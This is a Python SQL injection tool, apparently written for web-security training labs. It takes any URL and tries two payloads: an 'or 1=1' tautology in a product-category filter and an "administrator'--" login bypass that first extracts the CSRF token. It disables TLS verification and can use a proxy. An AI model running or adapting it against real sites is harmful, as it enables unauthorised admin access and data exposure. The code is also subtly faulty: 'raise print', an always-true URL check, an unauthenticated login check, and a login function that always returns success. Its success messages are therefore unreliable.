import requests
import re
import requests
import urllib3
import os 
import dotenv

dotenv.load_dotenv(dotenv_path="../.env")
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

USE_PROXY = os.getenv("USE_PROXY", "false").lower() == "true"
proxy ={
    'http': os.getenv("PROXY_HTTP"),
    'https': os.getenv("PROXY_HTTPS")
} if USE_PROXY else None

class Sqli:
    def __init__(self, url):
        self.url = url.rstrip("/")
        self.login_url = f"{self.url}/login"
        self.session = requests.Session()

        if proxy:
            self.session.proxies.update(proxy)  
        self.session.verify = False

    def csrf_token_extract(self):
        try:
            url_get = self.session.get(url=self.login_url, verify=False).text
            csrf = re.search(r'name="csrf" value="([^"]+)"', url_get).group(1)
            if not csrf:
                raise print(f"CSRF was not found. You might have to check the website (ᵕ—ᴗ—)")
            return csrf
        except requests.exceptions.RequestException as e:
            print(f"RequestError: {e}")
            return None
        except ValueError as e: 
            print(f"Unexpected error: {e}")
            return None

    def login(self, username, password):
        csrf_token = self.csrf_token_extract()
        if csrf_token is None:
            print(f"CSRF was not found. You might have to check the website (ᵕ—ᴗ—)")
        login_info = {
            "username": f"{username}", 
            "password": f"{password}", 
            "csrf": csrf_token 
        }
        try:
            self.login_page_post = self.session.post(url=self.login_url,  data=login_info,  verify=False, allow_redirects=True)
            return True

        except requests.exceptions.Timeout:
            print("Error: Request timed out")
            return False
        
        except requests.exceptions.RequestException as e:
            print(f"Error: Network request failed - {e}")
            return False
        
    def check_login(self):
        try:
            request = requests.get(f"{self.url}/my-account?id=administrator")
            if request.status_code != 200:
                return False
            return True
        
        except requests.exceptions.Timeout:
            print("Error: Request timed out")
            return False
        
        except requests.exceptions.RequestException as e:
            print(f"Error: Network request failed - {e}")
            return False

    def released_sqli(self):
        print("Trying released sqli")
        exploit_result = self.session.get(url=f"{self.url}/filter?category=Gifts' or 1=1 --")
        if exploit_result.status_code != 200:
            return False
        return True
    
    def sqli_login_bypass(self):
        login_post_status = self.login("administrator'--", "hi")
        login_get_status = self.check_login()
        if not login_post_status and not login_get_status:
            return False
        return True
            
    
    def main(self):
        exploit_methods = [
            ("released_sqli", self.released_sqli),
            ("login_bypass", self.sqli_login_bypass)
        ]

        for method_name, method in exploit_methods:
            if method():
                print(f"{method_name} was successfull")
            
        print(f"Sorry")
        
url = input("Enter the url: ")
if url is not None or url != "":
    sqli = Sqli(url)
    sqli.main()
else:
    print("Please enter the url")